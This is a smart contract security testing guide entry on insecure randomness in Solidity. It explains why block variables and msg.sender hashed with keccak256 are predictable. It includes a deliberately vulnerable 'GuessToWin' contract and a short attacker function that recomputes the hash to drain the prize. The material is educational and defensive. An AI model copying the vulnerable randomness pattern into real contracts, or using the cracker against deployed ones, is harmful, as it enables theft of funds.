# Insecure Randomness

## Summary

Randomness sometimes is used as a deciding factor in smart contract, sometime it is also used as an additional args to create an identifier, but not all randomness is actually secure. Some are predictable and resulting someone to gain unfair advantages.

## Test Objectives

- Ensure source of randomness is truly random.

## How to Test

There are many factors and attributes that people usually use for creating randomness, some of them are not secure

1. **`block` global variables**
The `block` global variable is used to get the blockchain information, like the `number`, `hash`, `timestamp`, `difficulty`, etc. Using them as a source of randomness is not secure because they are easy to predict.

2. **The `abi.encodePacked()` Custom**
Most of the time, the `block` global variables will be combined using many other args like the `msg.sender` or even another `block` attributes. Funny enough, it will then be hashed using `keccak256` then typecast to `uint256` to get a random number, which of couse not that random if the attacker can get the attributes.

## Examples

Let's use a simple contract here to demonstrate the danger of insecure randomness, supose there is a smart contract that using the randomness to call a function that will give the one who answer the function correctly a huge amount of Ether

```solidity
contract GuessToWin{

    constructor() payable{
        require(msg.value == 10000 ether);
    }

    function guess(uint _guess) public{
        require(address(this).balance == 10000 ether);
        uint random = uint(keccak256(abi.encodePacked(
            block.timestamp, 
            msg.sender,
            address(this) 
        )));
        if (_guess == random){
            (bool sent, ) = msg.sender.call{value: address(this).balance}("");
            require(sent);
        }
    }
}
```

the source of randomness comes from 3 sources, the `block.timestamp`, the address of `msg.sender` and the address of the `GuessToWin` contract, which all of them are easy to predict. A simple attack contract with a function like this could crack the random and get all the prize money

```solidity
function cracker() public{
    uint answer = uint(keccak256(abi.encodePacked(
        block.timestamp,
        address(this),
        address(GTW)
    )));
    GTW.guess(answer);
}
```

## References

- [Common Vulnerabilities in Solidity: Randomness](https://www.slowmist.com/articles/solidity-security/Common-Vulnerabilities-in-Solidity-Randomness.html)
- [SC08-Insecure Randomness](https://owasp.org/www-project-smart-contract-top-10/2023/en/src/SC08-insecure-randomness.html)
- [Preventing the source of randomness vulnerability](https://www.infuy.com/blog/preventing-the-source-of-randomness-vulnerability/)